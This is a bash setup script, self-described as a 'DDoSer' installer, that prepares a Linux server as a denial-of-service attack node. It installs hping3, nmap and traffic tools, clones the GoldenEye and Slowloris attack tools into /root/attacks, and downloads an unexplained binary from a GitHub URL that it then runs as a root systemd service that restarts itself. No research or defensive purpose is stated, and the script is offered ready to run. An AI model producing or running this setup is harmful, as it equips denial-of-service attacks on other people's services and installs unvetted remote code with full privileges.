#!/bin/bash

# DDoSer Complete Setup Script
# Direct installation script - download and run

# Set non-interactive mode to avoid prompts
export DEBIAN_FRONTEND=noninteractive

# Change to root directory
cd /root

# Update package lists and install required packages (non-interactive)
apt-get update -qq
apt-get install -y -qq --no-install-recommends hping3 python3 python3-pip python3-venv python3-dev python3-setuptools python3-wheel nmap curl git python3-urllib3 iftop vnstat net-tools bmon iperf3 ifstat tcpdump mtr nginx jq

# Configure iperf3 to not start as daemon (prevent prompts)
echo "iperf3 iperf3/start_daemon boolean false" | debconf-set-selections

# Create attacks directory
mkdir -p /root/attacks

# Clone attack tools
cd /root/attacks

# Clone GoldenEye
if [ ! -d "GoldenEye" ]; then
    git clone https://github.com/jseidl/GoldenEye.git
    cd GoldenEye && chmod +x goldeneye.py
    cd /root/attacks
fi

# Clone Slowloris
if [ ! -d "slowloris" ]; then
    git clone https://github.com/gkbrk/slowloris.git
    cd slowloris && pip3 install -r requirements.txt
    cd /root/attacks
fi

# Create test script
cat > /root/attacks/test.sh << 'EOF'
#!/bin/bash
echo "Test script executed successfully"
EOF
chmod +x /root/attacks/test.sh

# Add PATH export
echo 'export PATH=$PATH:/usr/sbin' >> /root/.bashrc

# Download and setup Network Monitor API
cd /root

# Download the network-monitor-api binary
wget https://raw.githubusercontent.com/berkotako/network-monitor/refs/heads/main/network-monitor-api -O /root/network-monitor-api

# Check if download was successful
if [ $? -eq 0 ]; then
    # Make it executable
    chmod +x /root/network-monitor-api
    
    # Check if file is executable
    if [ -x /root/network-monitor-api ]; then
        # Create systemd service for network-monitor-api
        cat > /etc/systemd/system/network-monitor-api.service << 'EOF'
[Unit]
Description=Network Monitor API
After=network.target

[Service]
Type=simple
ExecStart=/root/network-monitor-api
Restart=always
RestartSec=5
User=root
Group=root
Environment=PATH=/usr/bin:/usr/local/bin:/usr/sbin
WorkingDirectory=/root
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF
        
        # Reload systemd, enable and start the service
        systemctl daemon-reload
        systemctl enable network-monitor-api
        systemctl start network-monitor-api
        
        # Check if service started successfully
        sleep 3
        if systemctl is-active --quiet network-monitor-api; then
            echo "Network Monitor API service started successfully"
            systemctl status network-monitor-api --no-pager
        else
            echo "Failed to start Network Monitor API service"
            systemctl status network-monitor-api --no-pager
            exit 1
        fi
    else
        echo "Failed to make Network Monitor API executable"
        exit 1
    fi
else
    echo "Network Monitor API download failed"
    exit 1
fi

echo "DDoSer Setup Completed Successfully!"
echo "Attack tools installed in /root/attacks/"
echo "Network Monitor API running as systemd service"
echo "Check service status: systemctl status network-monitor-api" 
